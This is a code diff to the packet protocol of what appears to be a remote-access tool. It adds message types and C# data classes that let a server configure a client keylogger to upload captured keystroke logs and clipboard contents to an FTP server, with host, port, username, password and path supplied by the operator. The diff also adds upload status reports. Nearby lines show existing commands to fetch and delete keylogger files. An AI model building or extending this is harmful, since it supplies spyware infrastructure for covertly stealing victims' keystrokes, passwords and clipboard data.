@@ -109,6 +109,8 @@ public enum PacketType
     KeyloggerGetFile     = 177,  // server→client: {Filename}
     KeyloggerFileContent = 178,  // client→server: {Filename, Content}
     KeyloggerDeleteFile  = 179,  // server→client: {Filename}
+    KeyloggerFtpConfig   = 184,  // server→client: {FtpHost,FtpPort,FtpUser,FtpPass,FtpPath,MaxSizeKb,ClipboardEnabled}
+    KeyloggerFtpStatus   = 185,  // client→server: {Event,Filename,Message,Attempt}
 
     // Hardware Stats (sent periodically by client alongside heartbeat)
     HardwareStats     = 36,   // client→server: {CpuUsage, RamUsed, RamTotal}
@@ -528,6 +530,23 @@ public class KeyloggerFilesResultData
 }
 public class KeyloggerGetFileData     { public string Filename { get; set; } = string.Empty; }
 public class KeyloggerFileContentData { public string Filename { get; set; } = string.Empty; public string Content { get; set; } = string.Empty; }
+public class KeyloggerFtpConfigData
+{
+    public string FtpHost          { get; set; } = string.Empty;
+    public int    FtpPort          { get; set; } = 21;
+    public string FtpUser          { get; set; } = string.Empty;
+    public string FtpPass          { get; set; } = string.Empty;
+    public string FtpPath          { get; set; } = "/";
+    public int    MaxSizeKb        { get; set; } = 500;
+    public bool   ClipboardEnabled { get; set; } = true;
+}
+public class KeyloggerFtpStatusData
+{
+    public string Event    { get; set; } = string.Empty;
+    public string Filename { get; set; } = string.Empty;
+    public string Message  { get; set; } = string.Empty;
+    public int    Attempt  { get; set; }
+}
 
 // ── CDP Signup ────────────────────────────────────────
 public class CdpSignupStatusData { public string Step { get; set; } = string.Empty; public string Message { get; set; } = string.Empty; }
